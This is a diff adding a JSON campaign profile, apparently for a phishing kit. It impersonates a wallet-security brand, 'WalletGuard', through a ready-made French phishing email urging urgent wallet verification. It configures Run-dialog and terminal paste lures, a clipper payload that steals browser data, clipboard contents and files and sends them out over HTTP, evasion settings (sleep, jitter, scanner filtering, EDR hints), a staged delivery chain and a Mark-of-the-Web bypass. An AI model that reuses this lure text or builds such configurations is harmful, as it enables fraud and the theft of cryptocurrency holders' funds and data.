@@ -1,0 +1,41 @@
+{
+  "id": "crypto",
+  "label": "Vérification de portefeuille",
+  "persona": {
+    "brand": "WalletGuard",
+    "voice": "alerte de sécurité produit",
+    "urgency": "critical",
+    "lexicon": ["portefeuille", "phrase de récupération", "sécurité", "vérification"]
+  },
+  "scenarios": ["captcha", "mfa_reset", "cloud_sync"],
+  "channels": {
+    "email": {
+      "subject": "Action requise : vérification de votre portefeuille {ref}",
+      "body": "Bonjour {name},\n\nUne connexion inhabituelle a été détectée sur votre portefeuille {ref}. Afin de protéger vos avoirs, une vérification d'identité est demandée avant {deadline}.\n\nLancez la procédure : {lure}\n\nÉquipe WalletGuard — {agent}"
+    }
+  },
+  "context": {
+    "inject": ["ref", "deadline", "name"]
+  },
+  "techniques": {
+    "surfaces": ["winr", "terminal"],
+    "min_reliability": 4,
+    "prefer_tags": ["stealth", "fileless"],
+    "avoid": ["winr-certutil", "winr-bitsadmin"]
+  },
+  "payload": {
+    "kind": "clipper",
+    "collect": ["browser", "clipboard", "files"],
+    "exfil": "http",
+    "sleep": 15,
+    "jitter": 0.2,
+    "edr_hint": ""
+  },
+  "opsec": {
+    "filter_scanners": true,
+    "dwell_hours": 2,
+    "variant_count": 3
+  },
+  "chain": ["lure", "stager", "stage2", "collect", "exfil"],
+  "exploits": ["motw-lnk"]
+}
